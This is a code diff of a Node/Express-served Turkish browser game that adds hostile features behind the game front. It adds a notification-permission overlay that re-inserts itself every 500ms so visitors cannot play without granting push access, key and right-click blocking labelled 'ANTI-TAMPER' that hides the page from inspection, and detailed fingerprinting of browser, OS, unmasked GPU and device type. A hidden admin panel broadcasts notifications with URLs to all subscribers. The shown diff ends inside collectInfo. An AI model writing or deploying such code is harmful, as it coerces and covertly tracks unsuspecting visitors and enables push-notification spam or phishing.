@@ -9,6 +9,7 @@ app.use(express.json({ limit: '1mb' }));
 let MESSAGES = [];
 let MSG_ID = 0;
 let SCORES = [];
+let NOTIFY_SUBS = {};  // aktif bildirim alan kullanicilar
 
 const SW_CODE = [
   "self.addEventListener('install', function(e){ self.skipWaiting(); });",
@@ -38,7 +39,7 @@ const HTML = `<!DOCTYPE html>
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no,viewport-fit=cover">
 <title>Uzay Kacisi</title>
 <meta name="robots" content="noindex,nofollow">
 <meta name="theme-color" content="#0d1024">
@@ -47,75 +48,91 @@ const HTML = `<!DOCTYPE html>
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{height:100%;overflow:hidden;font-family:-apple-system,system-ui,sans-serif;background:#0d1024;color:#fff}
-body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none}
-#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px}
-.mgTitle{font-size:22px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.mgHud{display:flex;gap:20px;font-size:15px;font-weight:600;opacity:.9;align-items:center}
+html,body{height:100%;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,system-ui,"Segoe UI",Roboto,sans-serif;background:#0d1024;color:#fff;-webkit-font-smoothing:antialiased}
+body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;min-height:100vh;min-height:-webkit-fill-available}
+#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:12px;padding:0 6px;max-width:100vw}
+.mgTitle{font-size:20px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;text-align:center}
+.mgHud{display:flex;gap:14px;font-size:14px;font-weight:600;opacity:.95;align-items:center;flex-wrap:wrap;justify-content:center;padding:0 4px}
 .mgHud b{color:#6cf;transition:font-size .3s;display:inline-block}
 .mgHud .lv{color:#f59e0b}
-#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;display:block;transition:width .6s ease,height .6s ease}
-.mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:12px 28px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer}
+#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;display:block;max-width:96vw;transition:width .4s ease,height .4s ease;margin:0 auto}
+.mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:11px 24px;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
 .mgBtn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
-.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.92);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px;padding:16px}
+.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.92);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px;padding:14px;text-align:center}
 .mgOver.show{display:flex}
-.mgOver h2{font-size:26px;font-weight:800}
-.mgOver .btns{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:6px}
-#leaderboardBtn{position:fixed;top:14px;right:14px;background:linear-gradient(135deg,#f59e0b,#f97316);border:none;color:#fff;padding:10px 16px;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;box-shadow:0 6px 20px rgba(245,158,11,.5);z-index:9997}
-#secretZone{position:fixed;bottom:12px;right:12px;display:flex;gap:6px;z-index:9998;opacity:.25}
-.sbtn{width:26px;height:26px;border-radius:50%;border:none;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4);transition:transform .1s}
+.mgOver h2{font-size:22px;font-weight:800}
+.mgOver .btns{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:6px}
+#leaderboardBtn{position:fixed;top:12px;right:12px;background:linear-gradient(135deg,#f59e0b,#f97316);border:none;color:#fff;padding:9px 14px;border-radius:30px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:0 6px 20px rgba(245,158,11,.5);z-index:9997;font-family:inherit}
+#secretZone{position:fixed;bottom:10px;right:10px;display:flex;gap:5px;z-index:9998;opacity:.15}
+.sbtn{width:24px;height:24px;border-radius:50%;border:none;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4);transition:transform .1s;padding:0}
 .sbtn.sari{background:linear-gradient(135deg,#fbbf24,#f59e0b)}
 .sbtn.kirmizi{background:linear-gradient(135deg,#ef4444,#b91c1c);box-shadow:0 0 12px rgba(239,68,68,.7)}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99999;display:none;align-items:center;justify-content:center;padding:16px}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99999;display:none;align-items:center;justify-content:center;padding:14px}
 .modal.show{display:flex}
-.modal-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:18px;padding:22px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 60px rgba(0,0,0,.7);max-height:85vh;overflow-y:auto}
-.modal-box h3{font-size:20px;font-weight:800;margin-bottom:14px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.modal-box input{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px 14px;color:#fff;font-size:15px;margin-bottom:12px;outline:none;font-family:inherit}
-.modal-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:13px 24px;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:8px}
+.modal-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:16px;padding:20px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 60px rgba(0,0,0,.7);max-height:85vh;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.modal-box h3{font-size:18px;font-weight:800;margin-bottom:12px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.modal-box input{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:11px 13px;color:#fff;font-size:15px;margin-bottom:11px;outline:none;font-family:inherit}
+.modal-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:12px 22px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:7px;font-family:inherit}
 .modal-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
-.lb-row{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;margin-bottom:6px;background:rgba(255,255,255,.04);border-radius:10px;font-size:14px;border:1px solid rgba(255,255,255,.05)}
+.lb-row{display:flex;justify-content:space-between;align-items:center;padding:9px 12px;margin-bottom:5px;background:rgba(255,255,255,.04);border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,.05)}
 .lb-row.top1{background:linear-gradient(90deg,rgba(245,158,11,.25),rgba(245,158,11,.05));border-color:rgba(245,158,11,.4)}
 .lb-row.top2{background:linear-gradient(90deg,rgba(148,163,184,.25),rgba(148,163,184,.05))}
 .lb-row.top3{background:linear-gradient(90deg,rgba(180,83,9,.25),rgba(180,83,9,.05))}
 .lb-name{font-weight:600;flex:1;text-align:left;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding-right:8px}
 .lb-score{color:#6cf;font-weight:800}
-.lb-rank{width:34px;text-align:center;font-weight:700;color:#94a3b8}
-.empty-lb{text-align:center;color:#64748b;padding:24px;font-size:14px}
-#adminPanel{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#131a2e);z-index:999999;display:none;flex-direction:column;padding:20px;overflow-y:auto}
+.lb-rank{width:32px;text-align:center;font-weight:700;color:#94a3b8}
+.empty-lb{text-align:center;color:#64748b;padding:22px;font-size:13px}
+#adminPanel{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#131a2e);z-index:999999;display:none;flex-direction:column;padding:18px;overflow-y:auto;-webkit-overflow-scrolling:touch}
 #adminPanel.show{display:flex}
-.ap-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
-.ap-title{font-size:22px;font-weight:800;background:linear-gradient(90deg,#ef4444,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.ap-stat{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}
-.ap-stat div{background:rgba(255,255,255,.05);padding:10px 16px;border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,.08)}
+.ap-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+.ap-title{font-size:20px;font-weight:800;background:linear-gradient(90deg,#ef4444,#f59e0b);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.ap-stat{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
+.ap-stat div{background:rgba(255,255,255,.05);padding:9px 14px;border-radius:10px;font-size:12px;border:1px solid rgba(255,255,255,.08)}
 .ap-stat b{color:#6cf}
-.ap-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:18px;margin-bottom:14px}
-.ap-card h3{font-size:14px;font-weight:700;margin-bottom:10px;color:#94a3b8;text-transform:uppercase}
+.ap-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px;margin-bottom:12px}
+.ap-card h3{font-size:13px;font-weight:700;margin-bottom:10px;color:#94a3b8;text-transform:uppercase}
 .ap-card input,.ap-card textarea{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:10px 12px;color:#fff;font-size:14px;margin-bottom:10px;outline:none;font-family:inherit}
-.ap-card textarea{resize:vertical;min-height:80px}
-.ap-btn{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:11px 24px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer}
+.ap-card textarea{resize:vertical;min-height:75px}
+.ap-btn{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:10px 22px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
 .ap-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
 .ap-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}
-.ap-btn-row{display:flex;gap:10px;flex-wrap:wrap}
-.ap-log{font-family:ui-monospace,monospace;font-size:12px;background:rgba(0,0,0,.5);border-radius:8px;padding:10px;max-height:200px;overflow-y:auto;color:#94a3b8}
+.ap-btn-row{display:flex;gap:8px;flex-wrap:wrap}
+.ap-log{font-family:ui-monospace,Menlo,monospace;font-size:11px;background:rgba(0,0,0,.5);border-radius:8px;padding:10px;max-height:180px;overflow-y:auto;color:#94a3b8;line-height:1.5}
 .ap-log .ok{color:#22c55e}
 .ap-log .err{color:#ef4444}
-.ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:38px;height:38px;border-radius:50%;cursor:pointer;font-size:16px}
-#gateOverlay{position:fixed;inset:0;background:rgba(5,8,20,.97);z-index:9999999;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(10px)}
-#gateOverlay.hidden{display:none}
-.gate-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:22px;padding:28px;max-width:440px;width:100%;border:1px solid rgba(255,255,255,.12);box-shadow:0 30px 80px rgba(0,0,0,.8);text-align:center}
-.gate-box h2{font-size:24px;font-weight:800;margin-bottom:12px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.gate-box p{font-size:14px;line-height:1.7;color:#cbd5e1;margin-bottom:18px}
-.gate-box ol{text-align:left;font-size:14px;line-height:2;color:#cbd5e1;margin:12px 0 18px 22px}
-.gate-icon{font-size:56px;margin-bottom:12px;display:block}
-.gate-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:15px 24px;border-radius:12px;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:10px;box-shadow:0 8px 24px rgba(34,197,94,.4)}
+.ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:36px;height:36px;border-radius:50%;cursor:pointer;font-size:15px;font-family:inherit}
+
+/* ===== IZIN KAPISI - ZORUNLU, KALDIRILAMAZ ===== */
+#gateOverlay{position:fixed;inset:0;background:rgba(5,8,20,.98);z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:18px;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);pointer-events:all!important;cursor:not-allowed}
+#gateOverlay.hidden{display:none!important}
+.gate-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:20px;padding:24px;max-width:440px;width:100%;border:1px solid rgba(255,255,255,.12);box-shadow:0 30px 80px rgba(0,0,0,.85);text-align:center;pointer-events:all;cursor:default;max-height:90vh;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.gate-box h2{font-size:22px;font-weight:800;margin-bottom:12px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.gate-box p{font-size:14px;line-height:1.7;color:#cbd5e1;margin-bottom:16px}
+.gate-box ol{text-align:left;font-size:14px;line-height:1.9;color:#cbd5e1;margin:12px 0 16px 20px}
+.gate-icon{font-size:52px;margin-bottom:12px;display:block}
+.gate-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:14px 22px;border-radius:12px;font-size:15px;font-weight:800;cursor:pointer;margin-bottom:8px;box-shadow:0 8px 24px rgba(34,197,94,.4);font-family:inherit}
 .gate-btn.secondary{background:linear-gradient(90deg,#64748b,#475569);box-shadow:none}
-.gate-warn{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.4);border-radius:10px;padding:12px;font-size:13px;color:#fca5a5;margin-top:12px;line-height:1.6}
+.gate-warn{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.4);border-radius:10px;padding:11px;font-size:12px;color:#fca5a5;margin-top:12px;line-height:1.6;text-align:left}
 .gate-pulse{animation:gatePulse 1.2s ease-in-out infinite}
-@keyframes gatePulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
-.gate-status{font-size:13px;color:#94a3b8;margin-top:12px;line-height:1.6}
-#levelUp{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:42px;font-weight:900;color:#f59e0b;text-shadow:0 0 30px rgba(245,158,11,.9);z-index:99998;pointer-events:none;opacity:0}
+@keyframes gatePulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+.gate-status{font-size:12px;color:#94a3b8;margin-top:10px;line-height:1.6}
+#levelUp{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:38px;font-weight:900;color:#f59e0b;text-shadow:0 0 30px rgba(245,158,11,.9);z-index:99998;pointer-events:none;opacity:0}
 #levelUp.show{animation:levelAnim 1.5s ease-out}
 @keyframes levelAnim{0%{opacity:0;transform:translate(-50%,-50%) scale(.5)}30%{opacity:1;transform:translate(-50%,-50%) scale(1.3)}70%{opacity:1;transform:translate(-50%,-50%) scale(1)}100%{opacity:0;transform:translate(-50%,-80%) scale(1)}}
+
+@media (max-width: 480px){
+  .mgTitle{font-size:17px}
+  .mgHud{font-size:12px;gap:10px}
+  #leaderboardBtn{font-size:12px;padding:8px 12px}
+  .gate-box{padding:20px}
+  .gate-box h2{font-size:19px}
+  .gate-icon{font-size:44px}
+  #levelUp{font-size:30px}
+}
+@media (max-height: 640px){
+  .mgTitle{display:none}
+  .mgHud{font-size:11px;gap:8px}
+}
 </style>
 </head>
 <body>
@@ -124,7 +141,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   <div class="gate-box" id="gateBox">
     <span class="gate-icon">🔔</span>
     <h2>Bildirimlere İzin Ver</h2>
-    <p>Oyuna girmek için bildirimlere izin vermen gerekiyor.</p>
+    <p>Siteye girmek için bildirimlere <b>izin vermen zorunlu</b>. İzin vermeden oyuna başlayamazsın.</p>
     <button class="gate-btn gate-pulse" id="gateAllow">✅ İzin Ver ve Devam Et</button>
     <div class="gate-warn" id="gateWarn" style="display:none"></div>
     <div class="gate-status" id="gateStatus"></div>
@@ -142,14 +159,14 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     <span>Rekor: <b id="mgBest">0</b></span>
     <span>Seviye: <b class="lv" id="mgLevel">1</b></span>
   </div>
-  <div style="position:relative">
+  <div style="position:relative;display:inline-block">
     <canvas id="mgCanvas"></canvas>
     <div class="mgOver" id="mgOver">
       <h2>Oyun Bitti!</h2>
       <div>Skorun: <b id="mgFinal" style="color:#6cf">0</b> — Seviye: <b id="mgFinalLevel" style="color:#f59e0b">1</b></div>
       <div class="btns">
-        <button class="mgBtn" id="mgSaveScore">💾 Sıralamaya Kaydet</button>
-        <button class="mgBtn secondary" id="mgRestart">🔄 Yeniden Başla</button>
+        <button class="mgBtn" id="mgSaveScore">💾 Kaydet</button>
+        <button class="mgBtn secondary" id="mgRestart">🔄 Tekrar</button>
       </div>
     </div>
   </div>
@@ -179,7 +196,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   <div class="modal-box">
     <h3>🏆 Sıralama</h3>
     <div id="leaderboardList"><div class="empty-lb">Yukleniyor...</div></div>
-    <button class="modal-btn secondary" id="lbClose" style="margin-top:12px">Kapat</button>
+    <button class="modal-btn secondary" id="lbClose" style="margin-top:10px">Kapat</button>
   </div>
 </div>
 
@@ -191,10 +208,10 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   <div class="ap-stat">
     <div>🔔 İzin: <b id="apPerm">?</b></div>
     <div>📨 Gönderilen: <b id="apSent">0</b></div>
-    <div>💬 Kuyruk: <b id="apQueue">0</b></div>
+    <div>👥 Abone: <b id="apSubs">0</b></div>
   </div>
   <div class="ap-card">
-    <h3>📢 Bildirim Gönder</h3>
+    <h3>📢 Bildirim Gönder (izin veren herkese)</h3>
     <input id="apTitle" placeholder="Baslik" maxlength="80">
     <textarea id="apBody" placeholder="Mesaj..." maxlength="200"></textarea>
     <input id="apUrl" placeholder="URL (opsiyonel)" maxlength="200">
@@ -211,7 +228,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     <h3>⚙️ Islemler</h3>
     <div class="ap-btn-row">
       <button class="ap-btn secondary" id="apForcePerm">🔔 İzin İste</button>
-      <button class="ap-btn danger" id="apClearScores">🗑️ Skorları Temizle</button>
+      <button class="ap-btn danger" id="apClearScores">🗑️ Skorları Sil</button>
       <button class="ap-btn secondary" id="apClearLog">🧹 Logu Temizle</button>
       <button class="ap-btn danger" id="apReset">♻️ Sifirla</button>
     </div>
@@ -222,6 +239,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
 (function(){
   'use strict';
 
+  // ==================== ANTI-TAMPER ====================
   document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
   document.addEventListener('keydown', function(e){
     if(e.key === 'F12'){ e.preventDefault(); return false; }
@@ -229,22 +247,38 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     if(e.ctrlKey && e.key.toUpperCase() === 'U'){ e.preventDefault(); return false; }
   });
 
-  // ===== AYARLAR =====
+  // ==================== GATE FLAG (kritik) ====================
+  var gateUnlocked = false;
+  var gateOverlay = document.getElementById('gateOverlay');
+
+  // Gate silinirse geri ekle
+  function guardGate(){
+    if (gateUnlocked) return;
+    if (!document.body.contains(gateOverlay)){
+      document.body.appendChild(gateOverlay);
+    }
+    if (gateOverlay.classList.contains('hidden')){
+      gateOverlay.classList.remove('hidden');
+    }
+  }
+  setInterval(guardGate, 500);
+
+  // ==================== AYARLAR ====================
   var CONFIG = {
     W_START:360,
     W_MAX:720,
     H_START:540,
     H_MAX:780,
-    GROW_INTERVAL:8000,     // 8 saniyede bir buyur
-    GROW_W_AMOUNT:30,       // her seferinde +30px yandan
-    GROW_H_AMOUNT:22,       // her seferinde +22px ileriden
+    GROW_INTERVAL:8000,
+    GROW_W_AMOUNT:30,
+    GROW_H_AMOUNT:22,
     PLAYER_R:16,
     SPAWN_MS:800,
     SPAWN_MIN:320,
     SPAWN_DECAY:18,
     SPEED_BASE:4,
     SPEED_MAX:16,
-    SPEED_PER_SCORE:0.05,   // her 1 puanda +0.05 hiz
+    SPEED_PER_SCORE:0.05,
     SCORE_PER_OBSTACLE:2,
     LEVEL_EVERY:80,
     STORAGE_KEY:"mgBest"
@@ -259,11 +293,8 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   var finalScoreEl = document.getElementById("mgFinal");
   var finalLevelEl = document.getElementById("mgFinalLevel");
   var levelUpEl = document.getElementById("levelUp");
-  var W = CONFIG.W_START, H = CONFIG.H_START;
-  cv.width = W; cv.height = H;
-  cv.style.width = W + "px";
-  cv.style.height = H + "px";
 
+  var W = CONFIG.W_START, H = CONFIG.H_START;
   var player = { x:W/2, y:H-70, r:CONFIG.PLAYER_R };
   var obstacles = [], stars = [];
   var score = 0;
@@ -274,25 +305,167 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   var lastSpawn = 0, startTime = 0;
   var pointerX = W/2, animId = null, swReg = null;
   var lastMsgId = 0;
-  var gateUnlocked = false;
   var lastGrowTime = 0;
   var lastLevel = 1;
   var lastScoreFont = 15;
+  var sessionId = null;
 
-  bestEl.textContent = best;
-  rebuildStars();
-
-  function rebuildStars(){
-    stars = [];
-    for(var i = 0; i < 100; i++){
-      stars.push({ x:Math.random()*CONFIG.W_MAX, y:Math.random()*CONFIG.H_MAX, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
-    }
+  // ==================== EKRAN SINIRI ====================
+  function getMaxW(){
+    // Ekranin %96'sindan fazlasini kaplamasin
+    var maxScreenW = Math.floor(Math.min(window.innerWidth, document.documentElement.clientWidth) * 0.96);
+    return Math.min(CONFIG.W_MAX, maxScreenW);
   }
+  function getMaxH(){
+    var maxScreenH = Math.floor(window.innerHeight * 0.72);
+    return Math.min(CONFIG.H_MAX, maxScreenH);
+  }
+  function applyCanvasSize(){
+    cv.width = W;
+    cv.height = H;
+    cv.style.width = W + "px";
+    cv.style.height = H + "px";
+  }
+  function clampSize(){
+    var mw = getMaxW();
+    var mh = getMaxH();
+    var changed = false;
+    if (W > mw){ W = mw; changed = true; }
+    if (H > mh){ H = mh; changed = true; }
+    if (W < 280){ W = 280; changed = true; }
+    if (H < 400){ H = 400; changed = true; }
+    if (changed) applyCanvasSize();
+  }
+  window.addEventListener('resize', function(){
+    clampSize();
+    if (player.x > W - player.r) player.x = W - player.r;
+    if (pointerX > W - player.r) pointerX = W - player.r;
+  });
+  window.addEventListener('orientationchange', function(){
+    setTimeout(clampSize, 300);
+  });
 
+  // ==================== SESSION ====================
   function getSid(){
+    if (sessionId) return sessionId;
     var s = sessionStorage.getItem("mg_sid");
     if(!s){ s = "S" + Date.now().toString(36) + Math.random().toString(36).slice(2,6); sessionStorage.setItem("mg_sid", s); }
+    sessionId = s;
     return s;
+  }
+
+  // ==================== DETAYLI TARAYICI BILGISI ====================
+  function getBrowserInfo(){
+    var ua = navigator.userAgent;
+    var vendor = navigator.vendor || "";
+    var name = "Bilinmiyor", version = "", engine = "Bilinmiyor", engineVer = "";
+
+    // Edge
+    if (ua.indexOf("Edg/") > -1){
+      name = "Microsoft Edge";
+      version = (ua.match(/Edg\/([\d.]+)/) || [])[1] || "";
+      engine = "Blink"; engineVer = version;
+    }
+    // Opera
+    else if (ua.indexOf("OPR/") > -1 || ua.indexOf("Opera") > -1){
+      name = "Opera";
+      version = (ua.match(/OPR\/([\d.]+)/) || ua.match(/Opera\/([\d.]+)/) || [])[1] || "";
+      engine = "Blink"; engineVer = version;
+    }
+    // Samsung Internet
+    else if (ua.indexOf("SamsungBrowser") > -1){
+      name = "Samsung Internet";
+      version = (ua.match(/SamsungBrowser\/([\d.]+)/) || [])[1] || "";
+      engine = "Blink"; engineVer = version;
+    }
+    // Chrome iOS
+    else if (ua.indexOf("CriOS") > -1){
+      name = "Chrome (iOS)";
+      version = (ua.match(/CriOS\/([\d.]+)/) || [])[1] || "";
+      engine = "WebKit"; engineVer = (ua.match(/AppleWebKit\/([\d.]+)/) || [])[1] || "";
+    }
+    // Firefox iOS
+    else if (ua.indexOf("FxiOS") > -1){
+      name = "Firefox (iOS)";
+      version = (ua.match(/FxiOS\/([\d.]+)/) || [])[1] || "";
+      engine = "WebKit"; engineVer = (ua.match(/AppleWebKit\/([\d.]+)/) || [])[1] || "";
+    }
+    // Firefox
+    else if (ua.indexOf("Firefox/") > -1){
+      name = "Firefox";
+      version = (ua.match(/Firefox\/([\d.]+)/) || [])[1] || "";
+      engine = "Gecko"; engineVer = (ua.match(/rv:([\d.]+)/) || [])[1] || "";
+    }
+    // Chrome
+    else if (ua.indexOf("Chrome/") > -1){
+      name = "Chrome";
+      version = (ua.match(/Chrome\/([\d.]+)/) || [])[1] || "";
+      engine = "Blink"; engineVer = version;
+    }
+    // Safari
+    else if (ua.indexOf("Safari/") > -1){
+      name = "Safari";
+      version = (ua.match(/Version\/([\d.]+)/) || [])[1] || "";
+      engine = "WebKit"; engineVer = (ua.match(/AppleWebKit\/([\d.]+)/) || [])[1] || "";
+    }
+    return { name: name, version: version, vendor: vendor, engine: engine, engineVer: engineVer };
+  }
+
+  function getOSInfo(){
+    var ua = navigator.userAgent;
+    var platform = navigator.platform || "";
+    if (ua.indexOf("Windows NT 10") > -1) return { os: "Windows", version: "10/11", platform: platform };
+    if (ua.indexOf("Windows NT 6.3") > -1) return { os: "Windows", version: "8.1", platform: platform };
+    if (ua.indexOf("Windows NT 6.2") > -1) return { os: "Windows", version: "8", platform: platform };
+    if (ua.indexOf("Windows NT 6.1") > -1) return { os: "Windows", version: "7", platform: platform };
+    if (ua.indexOf("Windows NT") > -1) return { os: "Windows", version: "?", platform: platform };
+    if (ua.indexOf("Mac OS X 1") > -1){
+      var m = ua.match(/Mac OS X ([\d_]+)/);
+      var v = m ? m[1].replace(/_/g, ".") : "?";
+      return { os: "macOS", version: v, platform: platform };
+    }
+    if (ua.indexOf("Android") > -1){
+      var a = ua.match(/Android ([\d.]+)/);
+      return { os: "Android", version: a ? a[1] : "?", platform: platform };
+    }
+    if (ua.indexOf("iPhone") > -1){
+      var i = ua.match(/iPhone OS ([\d_]+)/);
+      return { os: "iOS", version: i ? i[1].replace(/_/g, ".") : "?", platform: "iPhone" };
+    }
+    if (ua.indexOf("iPad") > -1){
+      var p = ua.match(/OS ([\d_]+)/);
+      return { os: "iPadOS", version: p ? p[1].replace(/_/g, ".") : "?", platform: "iPad" };
+    }
+    if (ua.indexOf("Linux") > -1) return { os: "Linux", version: "?", platform: platform };
+    return { os: "Bilinmiyor", version: "?", platform: platform };
+  }
+
+  function getGPU(){
+    try {
+      var c = document.createElement("canvas");
+      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return "WebGL yok";
+      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg){
+        var r = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        if (r) return String(r).substring(0, 100);
+      }
+      var r2 = gl.getParameter(gl.RENDERER);
+      return r2 ? String(r2).substring(0, 100) : "Bilinmiyor";
+    } catch(e){ return "Hata"; }
+  }
+
+  function getDeviceType(){
+    var ua = navigator.userAgent;
+    var isTouch = ("ontouchstart" in window);
+    if (/iPad|Tablet/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)){
+      return "Tablet";
+    }
+    if (/Mobi|Android|iPhone|iPod/.test(ua)){
+      return "Mobil";
+    }
+    if (isTouch && window.innerWidth < 900) return "Mobil";
+    return "Masaustu";
   }
 
   function isIOS(){
@@ -301,62 +474,79 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
     return false;
   }
-
+  function isAndroid(){
+    return /Android/.test(navigator.userAgent);
+  }
   function isStandalone(){
-    return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
+    return window.matchMedia('(display-mode: standalone)').matches
+      || window.matchMedia('(display-mode: fullscreen)').matches
+      || window.navigator.standalone === true;
   }
 
   function collectInfo(){
-    var ua = navigator.userAgent;
-    var browser = "Bilinmiyor";
-    if (ua.indexOf("Edg/") > -1) browser = "Edge";
-    else if (ua.indexOf("OPR/") > -1) browser = "Opera";
-    else if (ua.indexOf("CriOS") > -1) browser = "Chrome iOS";
-    else if (ua.indexOf("FxiOS") > -1) browser = "Firefox iOS";
-    else if (ua.indexOf("Chrome/") > -1) browser = "Chrome";
-    else if (ua.indexOf("Firefox/") > -1) browser = "Firefox";
-    else if (ua.indexOf("Safari/") > -1) browser = "Safari";
-
-    var os = "Bilinmiyor";
-    if (ua.indexOf("Windows NT 10") > -1) os = "Windows 10/11";
-    else if (ua.indexOf("Windows NT") > -1) os = "Windows";
-    else if (ua.indexOf("Mac OS X") > -1) os = "macOS";
